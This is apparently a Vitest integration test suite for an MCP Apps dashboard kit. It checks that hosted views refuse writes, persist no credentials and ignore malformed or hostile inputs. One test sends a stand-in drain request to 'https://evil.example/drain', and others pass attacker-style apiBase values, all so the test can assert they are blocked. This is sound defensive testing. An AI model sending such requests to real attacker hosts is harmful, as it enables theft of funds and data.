/**
 * @vitest-environment jsdom
 *
 * MCP Apps — host + browser INTEGRATION (audit directive 14).
 *
 * Complements mcp-app-view-lifecycle.test.ts (init lifecycle + mount + hostile
 * frame + forged token) and mcp-apps-hardening.test.ts (directive 10 helper unit
 * tests). This file proves the pieces those don't:
 *
 *  1. A live READ binding flows through the kit's HostTransport (forced PCC
 *     origin, every path via safeApiPath) with a mocked fetch as the "server",
 *     while every WRITE is DISABLED in host mode (R4 PR1 lockdown, D10) — no
 *     mutating request leaves a hosted view, and the full-kit boot renders write
 *     controls visibly disabled.
 *  2. Two independent view boots, each handed a `token`, write NOTHING to
 *     sessionStorage — the transport never persists a credential, so there is no
 *     shared `pcc.key` for one view to inherit from another (the D8b concern).
 *  3. Malformed structuredContent (null / wrong-typed manifest / missing params)
 *     is inert: no mount, no throw.
 *  4. A PRIVATE dashboard renders from the AUTHENTICATED tool-result's
 *     structuredContent — the view mounts it directly, never a second anon lookup.
 *
 * ─── RESIDUAL GAP — MANUAL pre-promotion host check (cannot be automated here) ──
 * A real Claude Desktop / ChatGPT Apps host applies a double-iframe sandbox, a
 * host-ENFORCED CSP built from `_meta.ui.csp` (not the HTML <meta>), and real
 * network — none of which jsdom reproduces. Before promoting the retagged image,
 * run these by hand against staging and attach the result to the deploy record:
 *   1. Deploy the retagged image to staging; record the image digest.
 *   2. Add the PCC MCP server (https://<staging>/mcp) and docs server (/mcp/docs)
 *      to Claude Desktop (or the ChatGPT Apps developer surface).
 *   3. Call render_pcc_dashboard with a sample manifest → the dashboard renders
 *      INLINE (not blank), the "waiting for the host" placeholder disappears, and
 *      the browser console shows NO CSP violation blocking capability.network.
 *   4. Call get_dashboard on a PRIVATE artifact you own → it renders from the
 *      authenticated result (never "Dashboard not found").
 *   5. Open a public share ui://pcc/dashboard/<slug> → renders read-only, no key.
 *   6. Trigger one approval/write action → the host approval dialog shows the REAL
 *      method/destination/amount from the request, the write hits capability.network,
 *      and a manifest api_base pointing elsewhere is ignored.
 *   7. Open two dashboard views; enter a key in one → the other still prompts for a
 *      key (validates the host's per-view iframe sessionStorage isolation).
 *   8. Run `node scripts/mcp-app-smoke.mjs https://<staging>` → PASS; attach the
 *      output + image digest to the deploy record.
 */

import { readFileSync } from "node:fs";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { DASHBOARD_CSD_URL } from "@pcc/spec";
import { runDashboardViewBoot, MCP_APP_TOOL_RESULT_METHOD } from "../mcp/mcp-app-view.js";

const HERE = dirname(fileURLToPath(import.meta.url));
const PCC_UI_SRC = readFileSync(
  resolve(HERE, "..", "..", "..", "..", "apps/dashboard/public/ui-kit/v1/pcc-ui.js"),
  "utf8",
);
const PCC_ORIGIN = "https://capability.network";

// ---------------------------------------------------------------------------
// Extract the kit's Transport + HostTransport (the exact wiring the live host
// mode uses) from source and evaluate it with a mocked fetch. Same source-slice
// pattern mcp-apps-hardening.test.ts uses for the pure helpers.
// ---------------------------------------------------------------------------

function extractFn(src: string, name: string): string {
  const start = src.indexOf(`function ${name}(`);
  if (start < 0) throw new Error(`kit fn not found: ${name}`);
  const open = src.indexOf("{", start);
  let depth = 0;
  for (let j = open; j < src.length; j++) {
    if (src[j] === "{") depth++;
    else if (src[j] === "}") {
      depth--;
      if (depth === 0) return src.slice(start, j + 1);
    }
  }
  throw new Error(`unbalanced braces extracting ${name}`);
}

function sliceRegion(src: string, startMarker: string, endMarker: string): string {
  const s = src.indexOf(startMarker);
  if (s < 0) throw new Error(`start marker not found: ${startMarker}`);
  const e = src.indexOf(endMarker, s);
  if (e < 0) throw new Error(`end marker not found: ${endMarker}`);
  return src.slice(s, e + endMarker.length);
}

interface HostTx {
  getJSON(path: string, query?: Record<string, unknown>): Promise<unknown>;
  send(
    method: string,
    path: string,
    body?: unknown,
  ): Promise<{ ok: boolean; status: number; body: unknown }>;
}

type FetchMock = (url: string, init?: Record<string, unknown>) => Promise<unknown>;

function buildHostTransport(fetchMock: FetchMock, key: string | null): HostTx {
  const bundle = [
    `var API_DEFAULT = ${JSON.stringify(PCC_ORIGIN)};`,
    `var __KEY__ = ${JSON.stringify(key)};`,
    `function getKey(){ return __KEY__; }`,
    extractFn(PCC_UI_SRC, "isAbsoluteOrSchemeUrl"),
    extractFn(PCC_UI_SRC, "safeApiPath"),
    sliceRegion(
      PCC_UI_SRC,
      "function Transport(apiBase, isHost) {",
      "HostTransport.prototype.streamSSE = Transport.prototype.streamSSE;",
    ),
    "return { make: function (base) { return new HostTransport(base); } };",
  ].join("\n");
  // eslint-disable-next-line @typescript-eslint/no-implied-eval
  const factory = new Function("fetch", "window", bundle) as (
    f: FetchMock,
    w: unknown,
  ) => { make: (base: string) => HostTx };
  // A window with no __PCC_HOST_BRIDGE__ → HostTransport falls back to the direct
  // fetch path (the CSP-allowed live channel), which is what we assert on.
  return factory(fetchMock, { __PCC_HOST_BRIDGE__: undefined }).make(PCC_ORIGIN);
}

function makeResp(body: unknown, ok = true, status = 200) {
  return { ok, status, headers: { get: () => null }, json: () => Promise.resolve(body) };
}

describe("R4 PR1 (D10) — HostTransport: reads flow through the forced origin; WRITES are disabled", () => {
  it("a live READ dispatches to the FORCED PCC origin via safeApiPath (Bearer attached)", async () => {
    const calls: Array<{ url: string; init?: Record<string, unknown> }> = [];
    const tx = buildHostTransport((url, init) => {
      calls.push({ url, init });
      return Promise.resolve(makeResp({ ok: true }));
    }, "pcc_live_userkey");

    await tx.getJSON("/api/jobs/j1", { status: "active" });

    expect(calls).toHaveLength(1);
    expect(calls[0].url).toBe(`${PCC_ORIGIN}/api/jobs/j1?status=active`);
    expect((calls[0].init?.headers as Record<string, string>).Authorization).toBe(
      "Bearer pcc_live_userkey",
    );
  });

  it("a WRITE is REFUSED in host mode — no network call, ever (R4 PR1 lockdown)", async () => {
    // PR1 disables all manifest-authored writes in a hosted view (a namespace
    // allowlist is not an operation allowlist — the confused-deputy D10). Even a
    // well-formed /api write to the correct origin issues NO request; PR2
    // reintroduces writes via a typed, server-authorized operation.
    const calls: Array<{ url: string; init?: Record<string, unknown> }> = [];
    const tx = buildHostTransport((url, init) => {
      calls.push({ url, init });
      return Promise.resolve(makeResp({ released: true }));
    }, "pcc_live_userkey");

    const res = await tx.send("POST", "/api/escrow/esc_1/release", { amount: 5, currency: "USDC" });

    expect(res.ok).toBe(false);
    expect(calls).toHaveLength(0);
    expect((res.body as { message?: string }).message).toMatch(/unavailable in this host/i);
  });

  it("an exfil/absolute write path is ALSO refused with no network call", async () => {
    const calls: string[] = [];
    const tx = buildHostTransport((url) => {
      calls.push(url);
      return Promise.resolve(makeResp({}));
    }, "pcc_live_userkey");

    const res = await tx.send("POST", "https://evil.example/drain", { amount: 9999 });

    expect(res.ok).toBe(false);
    expect(calls).toHaveLength(0);
  });

  it("REFUSES a non-/api|/sse read path in host mode (namespace allowlist), no fetch", async () => {
    const calls: string[] = [];
    const tx = buildHostTransport((url) => {
      calls.push(url);
      return Promise.resolve(makeResp({}));
    }, null);

    await expect(tx.getJSON("/internal/admin")).rejects.toThrow(/unsafe/);
    expect(calls).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// jsdom boot helpers (mirroring mcp-app-view-lifecycle.test.ts) for the
// transport-layer behaviors below.
// ---------------------------------------------------------------------------

const STUB_KIT = "/* stub kit */ window.__STUB_KIT_RAN__ = true;";

function manifestFor(title: string) {
  return {
    csd: DASHBOARD_CSD_URL,
    title,
    sections: [{ windows: [{ kind: "note", text: "hello" }] }],
  };
}

function setupManifestDom(): void {
  document.body.innerHTML = "";
  const main = document.createElement("main");
  main.id = "pcc-root";
  const status = document.createElement("p");
  status.id = "pcc-kit-status";
  status.textContent = "Waiting for the host…";
  main.appendChild(status);
  document.body.appendChild(main);
  const m = document.createElement("script");
  m.type = "application/json";
  m.id = "pcc-manifest";
  m.textContent = "null";
  document.body.appendChild(m);
}

function makeWin() {
  const posted: Array<Record<string, unknown>> = [];
  const parent = { postMessage: (m: Record<string, unknown>) => posted.push(m) };
  let handler: ((event: { source: unknown; data: unknown }) => void) | undefined;
  const win = {
    parent,
    document,
    addEventListener: (type: string, h: (event: { source: unknown; data: unknown }) => void) => {
      if (type === "message") handler = h;
    },
  } as Record<string, unknown>;
  const deliver = (data: unknown, source: unknown = parent) => {
    if (handler) handler({ source, data });
  };
  return { win, parent, posted, deliver };
}

const toolResult = (structuredContent: Record<string, unknown>) => ({
  jsonrpc: "2.0",
  method: MCP_APP_TOOL_RESULT_METHOD,
  params: { content: [{ type: "text", text: "ok" }], structuredContent },
});

describe("directive 14 — the transport writes NO credential (cross-view pcc.key isolation)", () => {
  beforeEach(() => window.sessionStorage.clear());
  afterEach(() => window.sessionStorage.clear());

  it("two independent view boots, each handed a token, write NOTHING to sessionStorage", () => {
    // View A.
    setupManifestDom();
    const a = makeWin();
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    runDashboardViewBoot(a.win as any, STUB_KIT);
    a.deliver(toolResult({ manifest: manifestFor("View A"), token: "pcc_live_A", apiBase: "https://evil.a" }));
    expect((a.win as { __PCC_BOOTED__?: boolean }).__PCC_BOOTED__).toBe(true);

    // View B (fresh DOM, separate window object).
    setupManifestDom();
    const b = makeWin();
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    runDashboardViewBoot(b.win as any, STUB_KIT);
    b.deliver(toolResult({ manifest: manifestFor("View B"), token: "pcc_live_B", apiBase: "https://evil.b" }));
    expect((b.win as { __PCC_BOOTED__?: boolean }).__PCC_BOOTED__).toBe(true);

    // The TRANSPORT persists no credential — there is no shared pcc.key for one
    // view to inherit from another. What IS isolated vs not, precisely:
    //  - isolated: the host sandboxes each MCP-App view in its OWN iframe origin,
    //    so each view has a SEPARATE sessionStorage; the transport writes nothing
    //    to it here regardless.
    //  - the ONLY writer of pcc.key is the kit, on an EXPLICIT user action (a
    //    #pcc_key fragment or the connect bar) — per-iframe, never from a host
    //    message. Two views sharing a key would require the host to place them in
    //    the SAME origin, which MCP-Apps hosts do not.
    expect(window.sessionStorage.getItem("pcc.key")).toBeNull();
    expect(window.sessionStorage.length).toBe(0);
  });
});

describe("directive 14 — malformed structuredContent is inert (no render, no throw)", () => {
  const bootAndDeliver = (payload: unknown) => {
    setupManifestDom();
    const { win, deliver } = makeWin();
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    runDashboardViewBoot(win as any, STUB_KIT);
    expect(() => deliver(payload)).not.toThrow();
    return win as { __PCC_BOOTED__?: boolean };
  };
  const notif = (structuredContent: unknown) => ({
    jsonrpc: "2.0",
    method: MCP_APP_TOOL_RESULT_METHOD,
    params: { structuredContent },
  });

  it("structuredContent:null → no mount, no throw", () => {
    const win = bootAndDeliver(notif(null));
    expect(document.getElementById("pcc-kit-status")).not.toBeNull();
    expect(win.__PCC_BOOTED__).toBeFalsy();
  });

  it("structuredContent.manifest wrong-typed (number) → inert", () => {
    const win = bootAndDeliver(notif({ manifest: 42 }));
    expect(win.__PCC_BOOTED__).toBeFalsy();
  });

  it("a notification missing params entirely → inert", () => {
    const win = bootAndDeliver({ jsonrpc: "2.0", method: MCP_APP_TOOL_RESULT_METHOD });
    expect(win.__PCC_BOOTED__).toBeFalsy();
  });
});

describe("directive 14 — a PRIVATE dashboard renders from the AUTHENTICATED result (no 2nd lookup)", () => {
  it("the saved view mounts whatever manifest the authenticated tool result carried", () => {
    setupManifestDom();
    const { win, deliver } = makeWin();
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    runDashboardViewBoot(win as any, STUB_KIT);

    const manifest = manifestFor("My private ops");
    // Simulates the owner's authenticated get_dashboard result for a PRIVATE
    // artifact: the manifest travels in structuredContent; the view renders it
    // directly and does NOT re-fetch by slug (which would fail the anon,
    // public-only lookup — the directive-5 concern).
    deliver(toolResult({ manifest, slug: "my-private-9999", name: "My private ops" }));

    expect((win as { __PCC_BOOTED__?: boolean }).__PCC_BOOTED__).toBe(true);
    const mounted = JSON.parse(
      (document.getElementById("pcc-manifest") as HTMLScriptElement).textContent || "null",
    );
    expect(mounted.title).toBe("My private ops");
  });
});

// ---------------------------------------------------------------------------
// R4 PR1 (D10/D14) — FULL real-kit boot. Boots apps/dashboard/public/ui-kit/v1/
// pcc-ui.js (the SAME source the view inlines) in jsdom with window.__PCC_HOST__
// set + a mocked global fetch + a manifest, then asserts: (a) a mutating action
// renders disabled and issues NO request even when its handler is invoked; (b)
// nothing is written to session/local storage and no key prompt renders; (c) a
// read binding STILL fetches; (d) non-host behaviour is unchanged.
// ---------------------------------------------------------------------------

describe("R4 PR1 — full pcc-ui boot: host mode read-only, non-host unchanged", () => {
  let savedFetch: typeof globalThis.fetch | undefined;

  beforeEach(() => {
    savedFetch = globalThis.fetch;
    window.sessionStorage.clear();
    window.localStorage.clear();
  });
  afterEach(() => {
    globalThis.fetch = savedFetch as typeof globalThis.fetch;
    delete (window as unknown as { __PCC_HOST__?: boolean }).__PCC_HOST__;
    delete (window as unknown as { __PCC_UI_BOOTED__?: boolean }).__PCC_UI_BOOTED__;
    window.sessionStorage.clear();
    window.localStorage.clear();
    document.body.innerHTML = "";
  });

  type Call = { url: string; init?: Record<string, unknown> };

  function bootRealKit(host: boolean, manifest: unknown): Call[] {
    const calls: Call[] = [];
    (globalThis as unknown as { fetch: unknown }).fetch = (
      url: string,
      init?: Record<string, unknown>,
    ) => {
      calls.push({ url: String(url), init });
      return Promise.resolve(makeResp({ ok: true, count: 3 }));
    };
    delete (window as unknown as { __PCC_UI_BOOTED__?: boolean }).__PCC_UI_BOOTED__;
    if (host) (window as unknown as { __PCC_HOST__?: boolean }).__PCC_HOST__ = true;
    else delete (window as unknown as { __PCC_HOST__?: boolean }).__PCC_HOST__;
    document.body.innerHTML = "";
    const root = document.createElement("main");
    root.id = "pcc-root";
    document.body.appendChild(root);
    const m = document.createElement("script");
    m.type = "application/json";
    m.id = "pcc-manifest";
    m.textContent = JSON.stringify(manifest);
    document.body.appendChild(m);
    // Run the REAL kit IIFE — mount() executes synchronously (readyState complete).
    // eslint-disable-next-line @typescript-eslint/no-implied-eval
    new Function(PCC_UI_SRC)();
    return calls;
  }

  function buttonByText(text: string): HTMLButtonElement | undefined {
    const all = Array.from(document.querySelectorAll("button")) as HTMLButtonElement[];
    return all.find((b) => (b.textContent || "").indexOf(text) !== -1);
  }

  const actionsManifest = {
    csd: DASHBOARD_CSD_URL,
    title: "Ops",
    sections: [
      {
        windows: [
          { kind: "actions", actions: [{ label: "Cancel job", path: "/api/jobs/j1/cancel", kind: "post" }] },
        ],
      },
    ],
  };

  it("host mode: a mutating action renders DISABLED and issues no request even if invoked", () => {
    const calls = bootRealKit(true, actionsManifest);
    const btn = buttonByText("Cancel job");
    expect(btn, "action button rendered").toBeDefined();
    expect(btn?.disabled).toBe(true);
    expect(document.querySelector(".pcc-host-note")).not.toBeNull();
    // Invoke the click handler directly (bypassing the disabled attribute) — the
    // dispatch + transport backstops still issue NO request.
    (btn as unknown as { onclick?: () => void })?.onclick?.();
    expect(calls).toHaveLength(0);
  });

  it("host mode: nothing is written to session/local storage and no key prompt renders", () => {
    bootRealKit(true, actionsManifest);
    expect(window.sessionStorage.getItem("pcc.key")).toBeNull();
    expect(window.sessionStorage.length).toBe(0);
    expect(window.localStorage.length).toBe(0);
    expect(document.querySelector(".pcc-connect")).toBeNull(); // no key-entry prompt in host mode
  });

  it("host mode: a read binding STILL fetches (forced PCC origin, no Authorization header)", () => {
    const readManifest = {
      csd: DASHBOARD_CSD_URL,
      title: "Status",
      sections: [{ windows: [{ kind: "metric", label: "Jobs", binding: { path: "/api/status" } }] }],
    };
    const calls = bootRealKit(true, readManifest);
    expect(calls).toHaveLength(1);
    expect(calls[0].url).toBe(`${PCC_ORIGIN}/api/status`);
    const headers = (calls[0].init?.headers || {}) as Record<string, string>;
    expect(headers.Authorization).toBeUndefined(); // host mode holds no key
  });

  it("non-host mode: the SAME mutating action is enabled and DOES issue a request (unchanged)", () => {
    const calls = bootRealKit(false, actionsManifest);
    const btn = buttonByText("Cancel job");
    expect(btn, "action button rendered").toBeDefined();
    expect(btn?.disabled).toBe(false);
    expect(document.querySelector(".pcc-host-note")).toBeNull();
    (btn as unknown as { onclick?: () => void })?.onclick?.();
    expect(calls).toHaveLength(1);
    expect(calls[0].url.endsWith("/api/jobs/j1/cancel")).toBe(true);
    expect(calls[0].init?.method).toBe("POST");
  });
});
